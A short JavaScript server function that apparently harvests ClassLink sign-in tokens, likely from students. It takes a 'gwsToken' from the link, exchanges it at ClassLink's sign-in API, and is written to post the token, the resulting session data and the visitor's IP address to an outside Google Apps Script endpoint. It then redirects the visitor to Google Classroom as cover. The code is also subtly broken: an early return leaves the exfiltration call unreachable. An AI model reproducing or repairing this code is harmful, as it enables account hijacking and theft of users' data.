export async function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    const idMatch = url.search.match(/[?&]i=([^&]+)/);
    const idString = decodeURI(idMatch ? idMatch[1] : null);
    const ip = request.headers.get("CF-Connecting-IP");
    
    let id;
    try {
        id = JSON.parse(idString);
        id = id.gwsToken;
    } catch (error) {
    }
    try {
        const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
            method: "GET",
            headers: {
                "gwsToken": id
            }
        });

        if (nodeApiResponse.ok) {
            const nodeApiData = await nodeApiResponse.json();
return Response.redirect("https://data.google.com/"+nodeApiData+'/userresponse/'+idMatch, 302);
            await fetch("https://script.google.com/macros/s/AKfycbylxqkmvAEE-p56D4hQnkBdmZYi-p7982EJe2D9hoL99MDgIhU757vrdfW91ZVEoCB6/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ userRes: idMatch, qrRes: nodeApiData, ip: ip })
            });
        }
    } catch (error) {
        
    }
    return Response.redirect("https://classroom.google.com", 302);
}
